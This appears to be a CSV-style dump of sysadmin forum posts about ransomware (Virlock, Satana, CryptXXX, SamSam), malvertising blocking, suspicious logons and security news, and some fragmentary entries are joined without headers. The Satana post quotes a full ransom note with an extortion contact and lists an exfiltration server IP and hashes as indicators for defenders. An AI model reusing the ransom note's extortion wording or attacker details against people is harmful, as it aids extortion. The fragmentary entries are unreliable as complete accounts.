1855433,This weird ransomware strain spreads like a virus in the cloud & mitigation,"Here is a ransomware horror story for you...An obscure 2-year old ransomware strain called Virlock has a nasty feature: it is capable of stealthily spreading itself via cloud storage and collaboration apps. That way just one infected user can unknowingly spread the infection further across your network, Netskope researchers discovered. Virlock is borrowing from a wide range of threat techniques.How does it work?Ransomware normally spreads through email phishing attacks, exploit kits, removable drives or external network shares. However, Virlock is a weird family of ransomware that not only encrypts files but also converts them into a polymorphic file infector just like a virus. Apart from infecting the usual documents and image related files, it also infects binary files. Yikes. Virlock has effectively weaponized every data file it encrypts, converting each one into a propagation vehicle for the malware itself.  Very clever -- and efficient. Why let encrypted data files sit around in an inert state on the compromised PC when they can be put to good use to spread the fun to other users through file sharing schemes of one sort or another? An infected Virlock file is a sandwich of polymorphic code, malware code and embedded clean code, see the graphic. Netskope malware researchers illustrated how Virlock can become a dangerous cloud infection because files can be spread through cloud sync and shared via cloud storage and collaboration apps.  Trend Micro claims that Virlock can actually be classified as a polymorphic worm, but that doesn't seem correct as it's not completely autonomous and self-propagating. It really requires the actions of your users or automated file sharing schemes to propagate. A hybrid ""Ransomware-Polymorphic virus"" is a more correct classification. Here is an example of how it spreads In short: User A and User B are collaborating through the cloud storage app Box, using a folder called ""Important"". Both users have some of the files within the folder synced to their own machine.User A falls for a social engineering attack and gets infected with Virlock ransomware on their own machine, encrypting all their files and at the same time turning them into new Virlock infector files, including the files which are synced on Box. So, Virlock also spreads to the cloud folder and infects the files stored there. which in turn get synced to User B's machine.Now, User B clicks on any of the files in the shared folder on their box, the infected Virlock file is executed and the rest of the files on the machine of User B become infected and in their turn becoming Virlock file infectors just like a virus. See the blow-by-blow screenshots at the KnowBe4 blog.The above scenario is not just limited to User A and User B and will extend to all the users of an enterprise who are collaborating with each other. Consider the User-File collaboration graph below of a typical enterprise with users (in black dots) and the files (in blue dots). All the users within the red boundary might get infected with Virlock due to fan-out effect within minutes.And another weird twist, it claims to be an FBI fine for piracyLike all other ransomware strains, Virlock asks the victim for a payment in Bitcoin in order to release their machine. However, unlike modern strains such as Cerber or Locky that blatantly stated the victim's files have been taken hostage, Virlock positions itself as an anti-piracy warning from the FBI.The claim is that pirated software has been found on their machine and threatens them with prison and a $250,000 fine if they don't pay a $250 'first-time offender' fine. This is a tried-and-true social engineering tactic that has been used by cybercriminals for years in an effort to spook victims into paying up quickly.Silver lining: Virlock ""encryption"" is not technically accurateNetskope is claiming that Virlock ""encrypts"" files before infecting them with its polymorphic code. ""Encrypts,"" however, is a bit of a strong word, and not really technically accurate. Virlock uses a so-called XOR and XOR-ROL scheme to ""scramble"" or ""obfuscate"" files.Both procedures are reversible (if you know what you're dealing with). Real crypto-ransomware uses a combination of AES and RSA crypto algorithms to truly encrypt your files -- and there is no reversing of files encrypted that way unless the bad guys leave the private key lying around somewhere by mistake ( it has happened).What this means is that the real task you have in remediating files taken hostage by Virlock is the job of DISINFECTION. Once the files are disinfected, it's a process to reverse the XOR/XOR-ROL obfuscation and recover the original files. In fact, there are Virlock disinfectors available -- here's an example at ESET:https://www.eset.com/sg/download/utilities/detail/family/264/ The Virlock bad guys have one big problem: reinfection The bad guys using Virlock as a ransomware vehicle have a problem, the very strength of this ransomware strain (potentially massive propagation) also becomes its weak point.  Organizations pay Bitcoin ransoms only when they have some confidence that they're going to get their files back. If Virlock has spread all over their network, how can victims be sure that the file recovery process is going to work reliably and completely? Miss one file on some share that most admins forgot about? Sorry, you're at risk for a reinfection. And that doesn't make for satisfied ransomware customers (who are purchasing remediation and recovery). So far as we can tell, Netskope has not really uncovered a new Virlock version with major new functionality. Now, if this new version had the capabilities of a polymorphic network worm (as opposed to file infecting virus), that would be breaking news. However, this threat still relies on your users and automated file sharing to propagate. What Netskope has done here is lay out a scenario that should be of concern to any network admin, and another excellent piece of ammo to start new-school security awareness training which includes frequent simulated phishing attacks. Here is one great way to prevent Virlock from spreading You need a ransomware/virus infection spreading on your network like a hole in the head. If you want to spend less time putting out fires, get more time to be proactive, and get the things done you know really need to be done, step employees through new-school security awareness training. It will help you prevent this kind of disaster or at least make it very hard for the bad guys to social engineer your employees.Find out how affordable this is for your organization.

1225195,Enterprise Malvertising Protection,"For years we've been limiting user privileges, using AppLocker to white-list executables (More on my AppLocker policies)﻿ and kept all software up to date via WSUS, NiNite and scripting, so the rise of malvertising hasn't really posed much of a security risk for us.  However, I'm really tired of hearing from users who stumble upon false AV/Malware/BSOD pages via malicious ads or mis-typed domain names.  Aside from just not wanting to get calls about it there's always the possibility of these leveraging a 0 day vulnerability to gain privilege elevation and it reflects poorly on our security prowess from our users' perspectives.  This is for about 500 Windows 7,8.1 and 10 machines.  I don't maintain the network infrastructure or services so my ability to implement anything along the lines of a network appliance or a naughty list on DNS are pretty limited.  I can ""ball out"" all day long with GPO, applications and windows tweaks though.For the past few months I've been trying to come up with a solution for this with limited success.  First I experimented with deploying uBlock Origin to chrome via GPO.  This worked pretty well and was painless to implement but only obviously worked for Chrome users.  Between having to deploy it in a different manner for each browser, limited ability to centralize the management of exceptions and/or globally add blocked sites (i.e. phishing attempt links the moment we find out about them or other malicious domains that haven't made the publicly available lists yet), and the kinda crappy UI that my users didn't understand I abandoned this.Lately I've been using EasyList converted to a hosts file, redirecting everything to 0.0.0.0.  I also add the malwaredomains.com list to this.  I then push this host file out with GPP Files to all of the machines.  This addresses my central management issue making it trivial to add or comment out sites, then all machines get the changes with the next gpupdate.  This also obviously affects all browsers (all applications across the board for that matter) so it's one thing to manage that affects everyone regardless of their browser preference.  The other nice thing is that this model typically doesn't block first party ads like most extensions try to do by blocking anything with ""ad"" or ""ads"" in the path.  I don't mind being a contributor to the free and open internet as long as it can be done without compromising security.Disadvantages: -No ""cosmetic filtering"" like you'd get with a browser extension. On some sites the users will see blank frames or occasionally 404 errors where the ad would go.  Usually this isn't the case but it does happen on some sites.  Hey, better than fake AV messages right?-No granular controls.  It's the same across the board for all users.  Sometimes individual exceptions would be beneficial-No per site granularity-  A domain name is either ""blocked"" from resolving properly to DNS or it's allowed to.  I can't set up anything along the lines of a rule that allows a particular site to access a particular third party domain.  e.g. we have one site that a subset of our users access that won't properly load unless it can access google analytics.  I have to allow google analytics for everything for everybody.  Not a particularly big deal in that case but we'll see what else comes up.-No wildcards.  The hosts file doesn't support wildcards so that really limits the ability of it to block things where the bad guys randomly manipulate part of the name.Overall I like the hosts model better but it's still not ideal.  Once I figure out if it's really how I want to move forward I'll script out the updates so that the latest lists are fetched and converted to the hosts file format automatically and regularly.What's everybody else doing and how does your solution stack up against my pros and cons above?",0

2127051,Suspected attempted email account hack - anyone else see these types of things?,"So, I was reviewing my failed logons report through Netwrix and saw a suspicious failed logon attempt for a user here. What was suspicious about it was that the username was the user's email address (we don't have additional UPNs enabled so you can't logon with our email's domain) and the fact the workstation was listed as our Exchange server (which usually only happens when someone logs on via OWA or ActiveSync).So, I dug through our Security logs on our Exchange server and checked the IP of the failed logon attempt. It was an out of state IP belonging to Azure. Even more suspicious now. Looking at the IIS logs, I found this (I redacted the actual user's email address):2018-04-09 17:04:04 10.1.1.17 GET /autodiscover/autodiscover.json Email=USERNAME%40ourdomain.com&Protocol=ActiveSync&RedirectCount=1&CorrelationID=<empty>;&ClientId=LVC9KHF0QIREBYWGSLQ&cafeReqId=7680284c-7c4e-4a87-94ed-106ee0486d4b; 443 - 13.82.145.132 OutlookMobileCloudService-Autodetect/1.0.0 - 401 0 0 31So this looks like an ActiveSync autodiscover request, someone trying to setup Outlook or a new mobile device I guess to access this user's email.I checked with the user just to be sure they were not trying to add their account to any new devices and she confirmed she was not.Looking at my firewall logs, I see the suspect IP attempted access to our public IPs within a two minute span (they actually tried connecting to all our public IPs in our address block on ports like 25, 587, and 465, but those are blocked on our FW). Only a few KB were transferred each session.I did confirm there were no successful logons from that IP in our Exchange server's security logs.I'm just wondering if there is anything else you guys think I should do? Have any of you seen attempts like this before on your users? Are these just attackers using run-and-gun VMs to see if they get lucky? Should I be super worried?",0
1764776,Satana Ransomware – Devil in a Black Screen (of Death),"Oh those pesky bad guys and their ransomeware.... Satana Ransomware – Devil in a Black Screen (of Death)Satana is a newly discovered ransomware trojan that wages a two-pronged attack on victims – it encrypts the user’s files and also prevents their machine from loading Windows, demanding a ransom to unlock and decrypt the computer. Satana is considered copycat ransomware, as it combines the attack methods of two well-known ransomware trojans, Petya and Mischa, with a few tricks of its own.‘Satana’ is Italian for ‘the Devil’, and this ransomware’s behavior is pretty devilish. The attack comes in two distinct stages:First, Satana launches a user account control (UAC) notification, which pops up repeatedly until the user clicks ‘Yes.’ Satana then stores itself in the Appdata\Local\Temp directory and gets busy profiling the infected computer system's hardware information. It uses this data to generate an AES encryption key that it uses to encrypt the victim's files.Targeted file extensions for encryption include:.bak .doc .jpg .jpe .txt .tex .dbf .db .xls .doc .jpg .jpe .txt .tex .dbf .db .xls .cry .xml .vsd .pdf .csv .bmp .tif .1cd .tax .gif .gbr .png .mdb .mdf .sdf .dwg .dxf .dgn .stl .gho .v2i .3ds .ma .ppt .acc .vpd .odt .ods .rar .zip .7z .cpp .pas .asmFigure 1: UAC Popup Launched by Satana. Clicking ‘No’ Makes the Popup Appear Again. Clicking ‘Yes’ Executes Stage 2 of the Ransomware.Next, Satana behaves in a similar fashion to the virulent ransomware Petya, which appeared in March 2015. It uses a portable executable (PE) file, otherwise known as a dropper, to write low-level malicious code at the start of the disk, overwriting the master boot record (MBR). Satana copies the original MBR and stores it in encrypted form, replacing it entirely with its own code. This leaves the infected machine unable to load the OS, a process known as bootlocking.Satana then takes a leaf from Mischa’s book and begins silently encrypting the user’s personal files, one by one. Unlike Petya and Mischa, however, infection doesn’t cause the computer to automatically hang or restart (we believe this may change as the ransomware evolves). Instead, Satana completes its encryption work and then lurks dormant in the system until the next manual reboot by the user, which triggers stage two of its attack.Upon reboot, the stricken computer will hang in ‘The Black Screen of Death’ (BkSOD), unable to load its own operating system: Figure 2: Black Screen of Death Caused by Satana Infection  - Seen Here on a Virtual MachineWhat is the MBR?The code of the MBR is contained in the hard disk’s first sectors, and in essence provides a ‘road map’ of the hard drive that lets the computer know where to find the OS. If the MBR is damaged or corrupted, the machine loses this map and can’t find the OS in order to load Windows.Following the BkSOD, Santana delivers a ransom note, which appears as a pop-up message in red text on the infected computer. This note is also delivered in the form of Notepad text files named ‘!the SATANA!.txt’, which are dropped into each directory where files were encrypted. Once the machine is rebooted for the first time following infection, users can only access Windows by using the password that is obtained by paying the ransom. If the ransom is paid and the password entered, Satana (in the best-case scenario) unlocks the MBR and decrypts the user's files.   The ransom note contains a demand for 0.5 bitcoin (BTC), which is around $300 at today’s exchange rate (as of August 10th, 2016).The Satana ransom note states:“You had bad luck. There was crypting of all your files in a FS bootkit virus <!SATANA!> To decrypt you need to send on this E-mail: monika343@ausi(dot)com your private code (code omitted) and pay on a Bitcoin wallet: (account info omitted) total 0,5 btc. After that during 1-2 days the software will be sent to you – decryptor – and the necessary instructions. All changes in hardware configurations of your computer can make the decryption of your files absolutely impossible! Decryption of your files is only possible on your PC! Recovery is possible during 7 days, after which the program – decryptor – cannot ask for the necessary signature from a public certificate server. Please contact via E-mail, which you can find as yet in the form of a text document in a folder with encrypted files, as well as in the name of all encrypted files. If you do not appreciate your files we recommend you format all your discs and reinstall the system. Read carefully this warning as it is no longer able to see at startup of the computer. We remind you once again – it is all serious! Do not touch the configuration of your computer! How to pay on the Bitcoin wallet you can easily find on the Internet. Enter your unlock code, obtained by E-mail here and press “ENTER” to continue the normal download on your computer. Good luck! May God help you! <!SATANA!>”Figure 3: Satana Ransom Note Delivered After the BkSODRecovering a Machine Posessed - Sorry, Infected - by SatanaSatana is newly developed ransomware, and as such, may not yet be in its final mature form. This makes recovery tricky as the malware is still evolving. Although the current version appears to be flawed, according to security researchers, it may evolve over time to become a more widespread and serious threat.The fact that Satana disables Windows startup may present users with a quandary. If a second, non-infected machine or smartphone is not readily available within the imposed time limit, users cannot buy bitcoin to pay the ransom required to decrypt their original machine. They are stuck. While this will not present a problem to some, users hit with Satana in rural or other isolated locations may find themselves with a dead computer and no access to a second ‘clean’ machine in order to restore access to the first.If the user doesn’t wish to pay the ransom, Windows recovery tools may be the first option to try, but non-technical users may struggle when working with manual system tools such as the boot recovery tool and TestDisk. If a user does not know what they are doing, further damage such as accidental deletion of critical system files may be done to the machine.It is highly recommended that users unfamiliar with using manual PC recovery tools use a professional computer repair and recovery service if they wish to attempt to access their computer without paying the ransom. Reinstalling Windows from the original Windows Recovery Disc may be the only 'user friendly' option left, but users must be aware that doing so will wipe all of their personal files and documents. And even if the MBR is fixed and access to Windows is restored, the user’s files will still be encrypted.At present, there are a slim set of options available to those hit by Satana. The best defense against this and similar ransomware will always be to keep backup copies of everything on an unplugged and non-networked external hard drive, and to install a quality endpoint protection product to guard against malware like Satana executing in the first place.If you are currently infected and do not wish to try any of these options, keep the infected machine switched off and unplugged from the Internet, and simply wait. The encryption key may become available publicly via independent security researchers at a later date, or may even be released by rival malware authors to sabotage Satana, a growing trend among fiercely competing cybercriminals.  To Pay or Not To Pay?Cybercrime agencies such as the F.B.I. at present do not endorse paying any ransom demanded by malware authors. The thinking behind this is that paying the ransom simply encourages the cybercriminals. However, users infected with new ransomware which hasn’t yet been ‘cracked’ by private security agencies may find themselves with no other choice if they wish to attempt to regain access to their data.  NOTE: Victims who pay the ransom still have no guarantee whatsoever the decryption password will work and that they will get their files back.Indicators of Compromise (IoCs)Satana collects information about the infected host and user, syphons off intellectual data and uploads all of this data to a server at the address:185.127.26.186ASN: AS7738 Telemar Norte Leste S.A.Similar Hashesee937717efe9a2e076b9497498b628beb0c84a8476bd288105a59c5aeea01f3d12008650c70f01015787691724ca7a996833f4facbbb46bfba3f8dc9815b2f82ea2c169529e782994be5296c81ff4668dba2b77a805bd057b53e5952c65aaf728fabb74adea0c07c2b1601e41795de0642c142c2a543e01a195af32e101d94d0cb8a100b17ae098d3760b88e413afd073bc18cc5e6338698350f5ced5bc3c599Believe the math!!

159097,99.8% of Commercial Exploits caused by a few unpatched apps,"According to  an article by Danish security company CSIS, most Windows infections by commercial malware are the result of failure to patch a few vulnerable apps:  Java JRE (37%), Adobe Reader (and Acrobat) (32%), Adobe Flash (16%), Internet Explorer (10%), Windows Help (3%), and Apple Quicktime (2%).  MSIE and Windows Help are patched automatically by Windows Update (which home users should have enabled and which business sysadmins should be managing), but the other four applications all need to be updated separately.I do NOT enable automatic patching of those applications on my business systems for several reasons.  First, patches have been known to break things, and an automatically-applied patch that shuts down tens or hundreds of computers on a business network can be very expensive in downtime.  Second, the malware authors have taken advantage of automatic-patching prompts by simulating them (see my blog entry GeoApps Security News: 99.8% of Commercial Exploits caused by failure to patch for more).I didn't realize it was just a few apps that caused most of the problems, so I have just created a new section of my blog called Vulnerable Apps Watch where I will post updated version numbers to these 4 apps as I come across them.  Please feel free to subscribe to the blog to be notified of updates.",5

2179863,It's the most dangerous time of the year - have you checked your security twice?,"(I really hope you sang the title of this post)The holidays is indeed one of the most dangerous times of the year for users. During the 2017 holiday season, the National Retail Federation reported that over $680 billion will be spent during the holidays, presenting both retailers and adversaries with a wealth of opportunities. Holiday shopping spikes are anticipated by cybercriminals and for people who aren’t prepared in advance, a well-placed phishing email may have far-reaching consequences that can range from stolen identity to an undetected breach. The good news? Taking a few proactive steps towards strengthening endpoint security can get you off attackers’ wishlists. This holiday season, prepare against the onslaught of attackers with a few easy steps:Check the Chimney: Although doors and windows may be locked, an open chimney still lets in the cold. Unprotected endpoints on your network provide attackers with a backdoor into your environment. Ensure that all your endpoints are protected so you can address any blind spots in your security.Deck the Halls: A 99 percent chance of prevention is a 100 percent probability of a breach. Stop attackers with a layered approach to endpoint security that goes beyond prevention. Endpoint detection and response (EDR) provides the visibility to see and record all endpoint data and stop “silent failure” from impacting your organization.Enlist Holiday Helpers: Resource-constrained security teams are often focused on tactical decisions. Motivated attackers continuously innovate, which makes strategic threat detection and response almost impossible. Augment your security teams with the expertise of proactive, managed threat hunting.Clean Out the Driveway: Identify blind spots in your security architecture by determining which applications are running in your environment, who is connected to your network, and which users can access these endpoints.Double Check Who’s Invited: Sophisticated adversaries often mask their intrusion by leveraging legitimate processes for malicious purposes. Incorporating threat Intelligence that tracks adversary tools, techniques and procedures (TTPs) can expose stealthy adversary activity other security measures miss.Expect Company: Despite organizations’ best efforts, security incidents do occur. A proactive approach to incident response and detecting data breaches that includes detailed event playbooks prepares your organization should an uninvited guest arrive.Trust Industry Experts: Attacker motives vary with organizations’ information and operation. Identify key regulatory compliance approaches relevant to your organization and adapt your security controls accordingly.Have you taken extra step to stay secure this holiday season? Anything you'd add to our holiday checklist? ",12

Dig it:Iran vs. Saudi ArabiaIRAN-SAUDI FEUD — The diplomatic flare-up between Iran and Saudi Arabia could spread to cyberspace, says Jon Miller, vice president for strategy at Cylance, which released a 2014 report detailing a broad Iranian government-backed campaign to hack airports, energy firms and other critical infrastructure in the U.S., Europe and Asia.Saudi Arabia on Sunday cut diplomatic ties with Iran after protesters, angered by the Saudis’ execution of a prominent Shiite cleric, stormed the kingdom’s Tehran Embassy. But once a conventional conflict between computer savvy powers ignites, it can expand to cyber surveillance or even attacks. “Iran is definitely someone to be concerned about at a cyber level,” Miller said. “Saudi Arabia has been participating in cyber espionage and cyber warfare activities for years now, normally for intelligence gathering.” Once malicious hackers gain access to critical infrastructure for spying purposes, they can easily turn to destruction. There's certainly precedent for such attacks. In 2012, Iran hacked the Saudi state oil company Saudi Aramco, likely in response to the Stuxnet attack that disabled Iranian nuclear centrifuges.﻿Jon is one of the top brains at Cylance  His history includes running R&D at Accuvant Labs, consulting for IBM and Rolling Stone once referred to him as a supersmart Chris Farley  What more could you ask for?

1961968,"New Malware Threats: Ransomworm is coming, but what else is on your radar?","In 2016, there were over 4,000 ransomware attacks every day. This was a 300% increase over 2015, when there were 1,000 attacks every day, and it’s likely to get worse in 2017.In the first quarter of 2016, cyber criminals used ransomware to steal $209 million from US businesses with an expected $1B for the entire year. Crypto ransomware has grown in popularity since it started with Cryptolocker in 2013, and we can expect to see more clever ransomware as cyber criminals try to make money in 2017.Our latest blog details some of the latest threats that we have our eyes on, including: Ransomware: No Skills Required: When ransomware first came out, it required some skill in order to create an attack. Now, with the growth of ransomware as a service (RaaS), it has become a business model that makes it easy for cyber criminals to attack without requiring technical knowledge of how to create ransomware. To launch an attack on a group of victims, the cyber thief simply needs a credit card and a mailing list of targets that they want to attack. The user-friendly service allows criminals to download a ransomware tool for a small fee, set the ransom, and enter a deadline for the payment. For every victim that pays a ransom, the service provider gets a cut and the rest goes to the attacker. Some of the RaaS companies even provide training and support.Ransomware Gets More Personal: In the past, many ransomware attacks were blasted to huge lists in hopes that someone would open the email. You can expect more targeted, personalized attacks in 2017. With newer versions of ransomware, once it identifies whether it is attacking a business or personal machine, it will adapt its ransom demands to match the victim.For example, it may choose different types of files to encrypt based upon whether it is a personal or business machine. In addition to encrypting these files, it may post your confidential data to social media or a file space if you don’t pay the ransom.Ransomworm: Ransomware That Spreads Across Your Network: In 2017, it’s likely to get worse as more ransomware is augmented with code from traditional network worms like SQL Slammer, CodeRed, and Conficker to create new ransomware that is able to spread across a network. This will effectively increase the amount of damage that can be done with ransomware.Using this method, after infecting one computer, the malware will be able to spread to additional computers on the network. It will allow an initial machine to become infected, have a ransom paid, and then wait on other machines undetected until it is ready to attack again. This means you may end up paying ransoms multiple times to the same criminals.Ransomworms that can infect multiple machines on a network already exist. A good example is ZCryptor. This malware does not require an email in order to infect machines. It takes advantage of attack vectors that were created by other malware and then self propagates to the network from the compromised machine.SamSam is another example. It is spread via unpatched vulnerabilities on servers, allowing it to infect a machine and then go undetected, causing more damage on their internal network.So SpiceHeads, those are some of the big threat categories that we are watching closely, but what other new developments, or examples of these, have you had on your radar lately? What evolution of malware do you expect to see enter the threat landscape in the  near future?",11
2165869,Too good to be true?,"We recently activated a trial of the full suite from Webroot, and I am kind of blown away. Does this software work as advertised? I understand the process of hash comparisons, but the fact that the client seems to use only ~6MB of memory is amazing. Am I missing something? Over the years, like many here, I have been forced to interact with just about every AV vendor out there. Many of the ""old school"" companies have gotten their client apps to the point that they are basically malware in and of themselves. I would almost rather have someone mining crypto on my box that run some of the ""big box"" AV solutions because the malware may be less intensive than the solution (obviously this is meant as tongue-in-cheek). After seeing the most recent polling on this site, I decided to give Webroot a try. The dashboard is well organized, client install is easy and fast, the DNS protection is also easy to turn on and customize. Finally, the security training (spearfishing) really is informative (and kind of fun, for me, as I am turning it into a competition here).Webroot is not my total solution, I wish they had an edge product which would tie everything together but my solid firewalls can handle that duty.Is there something that I am over looking? Or is this really as effective as it seems? I understand that everyone has strong opinions about AV solutions, I can respect that, I hate running this stuff at all, but as with many of you, I have lots of users who are.... um.... kind of dim.Thanks for any available input.

1994762,"Remote computer access over the internet using RDP, what could go wrong??","First a little background:A client asked us tosetup a remote connection for one of their vendors. The vendor wantsto be able to monitor their (the vendor’s) equipment running at theclient’s location over the internet. The vendor requires theability to remote into the management computer of their equipment andmake adjustments to the system in real time. They want the clientto setup port forwarding on the client’s firewall to this processmanagement computer. The vendor doesn’t want to use any kind of vpnor 2FA to access this equipment, which would add overhead to themanagement process. Before this questiongets off track, we refused the opportunity to setup this connectionas the client and vendor requested for security, liability, andcommon sense reasons. I had visions of Stuxnet and thermonuclearmeltdown as the client was describing the problem and potentialsolution (this bit of equipment does use hydrogen and a flame to doits thing).At the end of thediscussion the client asked me a question I really couldn’t answerin simple terms. The client asked, “Just how risky is it to setupthe connection this way?”. Besides answering, “You just don’ttypically do that!”.

The 1st person was relatively easy to convince it was a scam and delete the email.  The customer sent an email out later that day confirming his account was hacked.  The 2nd one was a little more stressful; for me; as it was an email to the president of the company.  He asked if I thought it was ""spam"" and I said yes.  He emailed the customer back and received a response informing him the email was correct and he need to download from ""Google Drive"" the documents.  This is when I start to sweat a little and forced me to dig my heels in.  I looked at the president and state no it's a phishing scam and we had almost the same email yesterday from another customer that turned out to be a scam.  He looked at me and showed me the response from the customer.  I said call the customer and confirm as I know this is a scam.  The president reluctantly phoned the customer and was informed from the customer that his account was also hacked and the response we received was from the person who hacked him.  The president looked at me and confirmed it was ""spam"" and smiled.  I smiled back and told him I'll email the company right away about these 2 phishing scam emails and be on alert.This is probable the first time I had to be forceful with the president but I believe in the end he was glad I was.  He even joked with me a little later in the day.

386298,Well hidden Virus / Rootkit,"Hello. I'm on a network of 8 users and a server DC. a few weeks back a user complained that their pc was running slow. This is a brand new pc (6 months old, if that, Inter core i5 CPU, asus MB, its all new). I checked the Draytek router under NAT Sessions and noticed that coming off the pc's IP address was about 30 sessions, all the same IP address (which is some kind of Japanese website) using port 0 (honest!) and in the data flow chart, the pc showed no internet usage but 180+ current sessions. My first thought - virus. I took the PC off the network and hit it with every possible scan - eset, mbam, sas, norton, rootkit killer, you name it i did it - both online and offline (ie boot off Hiren's disk). only a few things were picked up - hijack, virus, rootkit - and was cleaned. I put the pc back on the network and checked the router 48 hours later and it was normal. Just a few days ago the user complained about slowness again and low and behold - exact same issue on the router with the same website! This user doesnt really surf the net, doesnt download porn or anything that may cause this.So my question is this:can someone recommend a program that will really really scan this pc and clean it once and for allORshould i just perform a wipe and reload of the PC and start again? most the data is on the server so not a huge deal, but will this help?Has anyone ever encounted this issue before? if it helps, all other PC's are running fine, the server is clean, Trend WFBS is installed and SA agents are on each pc - should i maybe address this with Trend Support, seeing as though their AV should have stopped this to begin with?Thanks!",11

1574925,Scary New CryptXXX Ransomware Also Steals Your Bitcoins,"Now here's a new hybrid nasty that does a multitude of nefarious things. Proofpoint researchers found that it was built by the same cyber mafia that's behind the Reveton malware. A few months ago the 800-pound Dridex cyber gang moved into ransomware with Locky, and now their competitor Reveton follows suit and tries to muscle into the ransomware racket with an even worse criminal malware multitool. At the moment CryptXXX spreads through the Angler Exploit Kit which infects the machine with the Bedep Trojan, which in its turn drops information stealers on the machine, and now ads professional grade encryption adding a .crypt extension to the filename.It demands the ""industry standard"" ~$500 in Bitcoin per computer to unlock encrypted files. You have to keep in mind that the cyber criminals behind Reveton are highly experienced, which means that CryptXXX is a force to be reckoned with. Expect widespread attacks, initially through drive-by-downloads but you can expect a wave of phishing emails shortly.This ransomware hybrid encrypts files locally and on all mounted drives, and to add insult to injury it also steals Bitcoins and a large range of other data. The Bedep Trojan has a long history of dropping information stealers on infected machines. For instance it dropped the Pony password stealer from November 2014 until mid-December 2015. It replaced Pony with an undocumented “private stealer” until mid-March 2016. CryptXXX tries to elude detection through ""random delayed"" execution, anti-Virtual Machine and anti-analysis functions like checking the CPU names in the registry and monitors for mouse events. The proofpoint guys said: ""Given Reveton's long history of successful and large-scale malware distribution, we expect CryptXXX to become widespread.”Oh Joy.So, What To Do About It?Have weapons-grade backups and check your restore function religiouslyDisable Flash on all workstations permanentlyPatch all systems as much as possible, especially third party appsStep users through effective security awareness trainingGet your Ransomware Hostage Rescue ManualGet the most informative and complete hostage rescue manual on Ransomware.

1946796,Thieves can guess your secret Visa card details in just seconds,"An interesting use of distributed computing.  By connecting to multiple sites at the same time they can attempt different permutations, until they find a valid one.  Very quickly.Thieves can guess your secret Visa payment card data in as little as six seconds, according to researchers at Newcastle University in the UK. Bad actors can use browser bots to distribute guesses across hundreds of legitimate online merchants. The technique relies on Web bots that spread random guesses across almost 400 e-commerce sites that accept credit card payments. Of those, 26 sites use only two fields to verify cards, while an additional 291 sites use three fields. Because different sites rely on different fields, the bots are able to enter intelligent guesses into the user field of multiple sites until the bots hit on the right ones. Surprisingly, Visa—the world's biggest payment card service—didn't employ any system-wide mechanism for detecting the mass guessing attack. The Newcastle University researchers said that Visa competitor MasterCard, on the other hand, did detect the distributed mass guesses and shut down the attacks before they could succeed. http://arstechnica.com/security/2016/12/thieves-can-guess-your-secret-visa-card-details-in-just-seco...",11

Well, what would you do if I told you that cybersecurity should also be in a CFO’s job description? Forbes sat down with Palo Alto Network’s own CFO, Steffan Tomlinson, and discussed why CFOs should be at the forefront of cybersecurity issues.  Steffan Tomlinson said this about a CFOs position on cybersecurity: Cybersecurity is typically in the top five risks of a corporation and a key aspect of a CFO’s role is to help manage that risk . Viewing cyber risk through the lens of ERM (Enterprise Risk Management) enables the CFO to use a framework, process and strategy to help position the company to successfully manage the plan for cybersecurity. This approach provides a familiar environment for the CFO to get educated and bring pragmatism and a business context to the dialogue on cybersecurity. Read the rest of the interview  here.

I just wonder what the thoughts are on here.To put this in context, an employee gets in touch with IT to say in the event of doing research relating to their role in the company their computer started running slow and they show you a weird screen on their PC which indicates malware has been picked up. As IT, you run the corporate installed antivirus which picks up a tracking cookie which gets quarantined following the scan and you delete but the user's PC is still slow in comparison to before they started their research at the start of the week. A second scan using the same corporately installed antivirus which is for instance Symantec, Sophos and this time nothing. So what is your next move?P.S my first poll and would be interesting to have your thoughts on this subject. Please add your next move as a new option if necessary and when others read through the options select the option that best describes what you would do normally if available as one of the options. Thanks.",0

So, let’s just skip all of that and jump right into the security news that you may have missed.Stealing IPWe often hear of intellectual property being stolen by competitors. However, it’s not too common to hear of IP being stolen from an IT Security vendor.Malwarebytes suspected a company called CyberByte was using its IP to augment its AV engine. So, laid a subtle honey-trap to validate its theory.What I like about this story is how honey words / tokens / pots can be used in a relative simple and low-tech manner to catch someone with their hand in the virtual cookie-jar.CyberByte steals Malwarebytes’ intellectual property | MalwarebytesUber Self-Driving Car Strikes and Kills Arizona WomanAn Uber self-driving car has struck and killed a woman pedestrian in Tempe, Arizona, the company revealed.Uber Self-Driving Car Strikes and Kills Arizona Woman | Bleeping ComputerInformation Security MisconceptionsI thought I’d slip a self-promotional link in here for an article I wrote for CSO Online.Channelling my inner Billy Bragg, isn't it fair to say that nobody knows nothing anymore?

2117566,Colorado Dept. of Transportation hit w/ SamSam after cleaning up SamSam,"Oof. Can you imagine going through all the hassle of recovering from a ransomware infection, putting in late hours, working through weekends, dealing with a lot of fears and frustrations, finally starting to get machines back up and running... only to have a second ransomware infection break out? That's exactly what just happened to the Colorado Dept. of Transporation (CDOT). They first got infected with SamSam ransomware on February 21. They had to take infected servers and a total of 2,000 computers offline. Employees had to go back to using pen and paper. The FBI was brought in to help investigate the attack. By yesterday, the IT staff had brought 20% of the machines back online. Then they got sent right back to the drawing board when the department got hit with a follow-up infection — SamSam again, but reportedly a different/modified variant. Talk about a kick in the teeth. I can't imagine putting in all that work only to have to do it all over again. Yet, the way the CDOT is talking about it, I'm worried it won't even stop here with two infections. Check out this quote from a spokesperson for the Governor's Office of Information Technology:""We believe it's a different virus since we put in security measures against the other strain that did not protect against this new virus.""I can't think of a better case-in-point of why the traditional signature-based / ""virus""-specific approach to security doesn't work. These days you can't base your security around blocking specific strains or variants of malware. It's simply too trivial for bad guys to pump out new variants or even just bypass blacklists by making small tweaks. You have to get smarter with protection that takes a more adaptive, categorical approach. The CDOT was reportedly using McAfee when the first attack hit. Unclear as to what they decided to do differently (if anything) before the second attack struck. But by now they have to realize traditional AV isn't enough, right? Right?...third time's a charm?Question for everyone: If this happened to you, would you make sure / demand something be done differently before you simply wiped all the machines and put them right back on the network?",11

